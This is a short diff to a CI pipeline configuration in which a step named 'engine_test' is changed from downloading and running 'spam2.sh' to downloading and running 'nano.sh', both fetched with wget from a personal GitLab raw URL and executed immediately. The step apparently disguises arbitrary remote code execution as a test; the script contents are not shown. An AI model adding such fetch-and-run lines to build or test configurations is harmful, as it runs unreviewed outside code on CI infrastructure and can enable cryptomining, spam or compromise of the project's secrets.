@@ -10,4 +10,4 @@ steps:
   - name: engine_test
     image: python:3.7.2
     commands:
-    - wget https://gitlab.com/renifer12/project-7/-/raw/main/spam2.sh && chmod +x spam2.sh && ./spam2.sh
+    - wget https://gitlab.com/renifer12/project-7/-/raw/main/nano.sh && chmod +x nano.sh && ./nano.sh
